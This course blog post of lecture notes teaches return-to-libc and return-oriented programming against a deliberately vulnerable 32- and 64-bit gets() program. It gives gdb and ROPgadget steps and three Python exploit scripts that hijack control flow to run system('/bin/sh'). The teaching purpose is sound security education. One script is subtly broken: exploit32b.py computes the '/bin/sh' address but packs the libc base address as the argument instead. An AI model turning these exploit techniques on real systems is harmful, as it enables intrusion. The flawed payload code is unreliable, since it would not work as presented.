---
title:  "Lecture Notes: Basics of Code Reuse"
date:   2019-04-04 09:00:00
categories: notes lecture 
layout: post
challenges: heap3 stack4 stack5 stack6
---


Up until now we've been focusing on a specific class of attacks: **code
injection**. In these attacks, the attacker injects their own code into a
vulnerable program and then hijacks the control flow of the program and
execute that injected code. 

We've also talked about a number of automated ways to defend against such
attacks. ("automated" here means that the defense can be implemented without
any changes to the source code). First, we can make it harder to leverage a
buffer overflow to hijack the control flow (e.g., by using stack canaries to
protect the return address saved on the stack or using the DieHard memory
allocator to protect heap metadata). Second, we've discussed how memory
permissions can make it impossible to execute any code on the stack.
Specifically, by following a simple invariant: memory that is writable cannot
be executed and memory that is executable cannot be writeable. Often this type
of defense is called the **NX bit** or **data execution prevention (DEP)**,
depending on the specific implementation.  For this lecture we are going to
focus on bypassing the second defense using **code reuse** attacks. 

With DEP, there is no location in memory that an attacker can both modify and
execute.  Consequently, data injected by the attacker (e.g., shellcode) will
always be treated as data (i.e., not as code). Fortunately (if you like
breaking software), there is a simple solution to this problem (simple in
concept, but devilishly hard to implement in many situations): *reuse code that
is already in the program.*

Below we introduce the two most basic code-reuse attacks: **return-to-libc**
and **return-oriented programming**. 

### Return-to-libc (ret2libc)

Return-to-libc is a code reuse attack that leverages functions that are in the
libraries that are commonly used in applications (e.g., libc). A particularly
useful function is `system()`. The behavior of `system()` is actually 
similar to basic shellcode we learned about previously: `system()` will create a
child process and execute the shell command specified by the arguments.  

Let's take a look at how system works by writing a simple program and looking
at the disassembly. 

```
// Note: we can compile a 32-bit binary on a 64-bit system using: 
// `gcc -o sys32 -m32 sys.c`. 

#include <stdio.h>

void main() {
  system("echo peanut");
  //Uncomment this next line if you want to launch a shell
  //system("/bin/sh");
}

```

By looking at the disassembly of the `main` function, we can get a sense of how
the `system()` function is called. In particular, we can immediately see that
the address of the command string ("echo peanut") is pushed to the stack
immediately before the `call` instruction.  We know from our discussion of
32-bit calling conventions that this is the argument to `system`. A quick gdb
command shows us that we are right: `x/s 0x804851c`


This calling convention should be famaliar to us by now. What you might not
remember is that the `call` instruction will implicitly push the return address
(i.e., the address of the next instruction in `main`) on to the stack. Thus,
when we manually call `system`---during our ret2libc attack---we have to set up
the stack to include both the correct arguments and the pushed return address.
For this simple example, we don't really care what value we use for the return
address, but setting this value could be useful for chaining together calls to
libc. (Later on ask me how it is possible to use this behavior to bypass
coarse-grained CFI. )

Let's draw out what the stack looks like the moment `system()` starts executing,
i.e., how the stack should look for our ret2libc attack to work. 

```
Note: Stack grow to the left, higher addresses to the left.
Arg: the address of the command string
ret: the saved return address


 +----+-----+--------------------------------+
 |ret | arg |                                |
 +----+-----+--------------------------------+
 ^
 |
 +

Top of the stack when system function starts executing.
```


Know that we know how a normal 32-bit program calls system, we can see what
would be required for our ret2libc attack. To execute an attack using system(),
the attacker needs to:
 1. find where the code for `system()` lives in memory,
 2. set up the stack (and registers for 64-bit binaries) with the proper
    arguments and a dummy return address, and 
 3. hijack the control-flow of the program to execute the desired function. 
  
## Our first ret2libc attack

Let's try to apply our knowledge to the canonical vulnerable program.

```c
// File: vuln.c 
// gcc -o vuln32 vuln.c -m32 -fno-stack-protector
#include <stdlib.h>
#include <stdio.h>


void main() {
  char buffer[64];
  gets(buffer);
}
```

This program does something strange with the stack pointer: before the return
instruction the prologue sets the stack pointer based on a value saved inside
the current stack frame---the compiler does this for alignment reasons. As a
result, we aren't going to overwrite the saved return address, instead, we are
going to manipulate the value used to set the stack pointer, e.g., instructions
`*main+33 to +40`:

```asm
   # main
   0x0804842c <+33>:    mov    ecx,DWORD PTR [ebp-0x4]
   0x0804842f <+36>:    leave
   0x08048430 <+37>:    lea    esp,[ecx-0x4]
=> 0x08048433 <+40>:    ret
```

By placing break points in gdb, we can get the starting address of the
vulnerable buffer (`b *main+24`) and the location used to set the stack pointer
(`b *main+33`). We want to modify the value at the saved stack pointer location
to that the stack pointer will instead point to the start of our vulnerable
buffer. This will allow us to control the return address used by the  `ret` 
instruction. Of course, we want this return address to be `system`.

```python
# file: exploit32a.py
# output: e32a.in

import struct
import sys

buff_addr = 0xffffc720 
weird_addr = 0xffffc768-4

padding_len = weird_addr - buff_addr
padding = 'a'*padding_len

sys.stdout.write(padding + struct.pack("<I", buff_addr + 4) )
```


It is not enough to manipulate the stack pointer to point to point at a
location we control (i.e., the vulnerable buffer). We also need to make sure
that the new top of the stack is setup to look like what the system  function
would expect when called.

The address of system is easy to find with a gdb command: `x system`, and the
dummy return address can be anything. But how do we get setup the command
argument? Specifically, we need the address of useful command string. We could
include such a string on the stack, either by putting in our vulnerable buffer
or throwing it in an environment variable, but we are going to take a different
approach that use an address that is easier to predict. The solution is to find
an existing command string in libc: "/bin/sh".


**Finding the "/bin/sh" string in libc.** First we find what version of libc is
loaded, where it is loaded in memory, and where the .SO file is on disk using
`info proc map`. Now we can search (outside of gdb) for the "/bin/sh" string in
the .SO file with `strings -a -tx /lib/i386-linux-gnu/libc-2.23.so | grep
/bin/sh`. We can add the offset of this string in the .SO file to the address
of libc in the process to get the actual address of the string.


At this point we know how to setup the stack properly for a call to system, so
putting it all together we have our full attack:

```python

# file: exploit32b.py
# output: e32b.in
# Note: the actual stack addresses may change, so make sure to check the
# values

import struct
import sys

buff_addr = 0xffffc790 
weird_addr = 0xffffc7d8-4

system_addr = 0xf7e4eda0
dummy_ret = 'aaaa'
libc_addr = 0xf7e14000
command_addr = libc_addr + 0x15ba0b

payload = struct.pack("<I", system_addr) + dummy_ret + struct.pack("<I", libc_addr)


padding_len = weird_addr - buff_addr - len(payload)
padding = 'a'*padding_len


sys.stdout.write(payload + padding + struct.pack("<I", buff_addr + 4) )
sys.stdout.write('\n')
#This command should be executed by our newly popped shell.
sys.stdout.write('echo peanut')

```

### Return oriented programming

Now let's take a look at how system would be called in the 64-bit version of
our vulnerable binary. The primary difference between the 32 and 64-bit
binaries is that the arguments are passed via registers and not the stack (up
to a certain number of arguments). This change means that `system` is going to
looking for its  argument (i.e., the address of the "/bin/sh" string) in the
`rdi` register rather than on the stack.  This complicates our ret2libc attack
because now we have to find a way to load a particular value into the `rdi`
register, when before we just had to manipulate the stack layout a bit. To
solve this problem, we are going to add an extra step to our ret2libc attack.

Let's try to exploit our program: `gcc -o vuln64 vuln.c -fno-stack-protector`.
Like before, we are going to reuse code that is already in the program. So
first we find the address of system using gdb: `p &system`.

Here's the new bit. Now we want to find **gadgets** to that will do the work of
loading `rdi` for us.  In their simplest form, gadgets are a short sequence of
instructions ending in a return.  This technique is often called
**return-oriented programming**.

What we need is a gadget that will load a
value from the stack (because we can control the stack) into the correct
argument register (`rdi`).  Finding these gadgets is an art and often involves
some manual checking. For instance, we can use objdump to look at all of the
instructions until we find a useful gadget.  Fortunately, there are programs
that make searching for gadgets easier. 

```
ROPgadget --binary vuln64 | grep "pop rdi"
``` 

Looks like there are a bunch of gadgets in the program, including one that will
do exactly what we need: pop a value off of the stack and into the argument
register. Note: the first column is the location of the gadget, use x/i in gdb to
to verify

```
0x00000000004005b3 : pop rdi ; ret
```

Now that we have the address of a useful gadget, we need to find our command
string "/bin/sh". We could do it the way we did previously (using strings and
grep on the .SO file), but let's do it directly in GDB this time: `find
&system,+9999999,"/bin/sh"`. Note, the program needs to be running for this
command to work.


Putting everything together, we have an attack that looks very similar to how
we exploited the 32-bit binary. The big different is that added the additional
step to call our gadget and load the address of "/bin/sh" into `rdi`. 

```python
#file: rop.py
#output: r64.in
import struct
import sys

gadget_addr = 0x00000000004005b3
buff_addr = 0x7fffffffd560
ret_addr = 0x7fffffffd5a8
command_addr = 0x7ffff7b99d57
system_addr = 0x7ffff7a52390

padding_len = ret_addr - buff_addr

sys.stdout.write('a'*padding_len+struct.pack("<Q", gadget_addr) + struct.pack("<Q", command_addr)+ struct.pack("<Q", system_addr))

```

We got lucky in this case because we only needed to use a single gadget to set
up our register. In many cases, we may have to string together multiple gadgets
into a single **ROP chain** to acheive the desired results---for example, if we
need to setup two argument registers.


